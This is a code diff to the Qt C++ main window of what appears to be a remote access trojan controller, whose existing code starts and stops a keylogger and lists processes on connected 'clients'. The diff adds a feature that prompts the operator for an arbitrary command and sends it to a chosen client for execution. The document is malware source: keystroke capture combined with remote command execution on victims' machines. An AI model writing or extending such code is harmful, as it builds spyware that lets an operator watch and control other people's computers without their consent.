@@ -84,6 +84,17 @@ void MainWindow::onClientResponse(const QString& clientId, const QString& text)
     appendClientOutput(clientId, text);
 }
 
+void MainWindow::executeCommand(const QString& clientId)
+{
+    bool ok = false;
+    QString cmd = QInputDialog::getText(this, tr("Execute Command"), tr("Enter command to run on client:"),
+                                        QLineEdit::Normal, QString(), &ok);
+    if (ok && !cmd.isEmpty()) {
+        qDebug() << "[GUI] Executing command on" << clientId << ":" << cmd;
+        emit sendToClient(clientId, cmd.toUtf8());
+    }
+}
+
 /**
  * @brief Handles user action on selection button, emitting appropriate signals.
  */
@@ -103,6 +114,9 @@ void MainWindow::onSelectionButtonClicked()
         case 2: emit stopKeylogger(clientId); break;
         case 3: emit requestProcessList(clientId, false); break;
         case 4: emit requestProcessList(clientId, true); break;
+        case 5: MainWindow::executeCommand(clientId); break;
+        // case 6: Placeholder for disconnecting client
+        // case 7: Placeholder for data analysis
         default: break;
     }
 }
